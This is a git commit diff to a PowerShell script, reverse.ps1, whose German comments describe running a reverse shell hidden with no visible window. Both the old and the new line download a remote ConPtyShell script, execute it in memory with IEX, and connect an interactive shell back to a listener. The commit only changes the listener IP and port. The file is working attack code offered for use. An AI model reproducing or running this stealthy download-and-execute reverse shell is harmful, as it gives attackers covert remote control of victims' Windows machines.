08e9ac6dd0e4ebb2e573b95d74c34c877a71019b
L400-yt <l400.h4ck@gmail.com>
2025-06-06 15:17:17 +0200

    Update reverse.ps1

--- reverse.ps1
+++ reverse.ps1
@@ -1,7 +1,7 @@
 # Dieses Skript führt den ConPtyShell-Befehl im Hintergrund aus, ohne ein sichtbares PowerShell-Fenster.
 
 # Definiere den Befehl, der ausgeführt werden soll
-$command = "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.2.15 3001"
+$command = "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.2.127 124"
 
 # Starte einen neuen PowerShell-Prozess im versteckten Modus
 # -WindowStyle Hidden: Sorgt dafür, dass kein Fenster angezeigt wird.
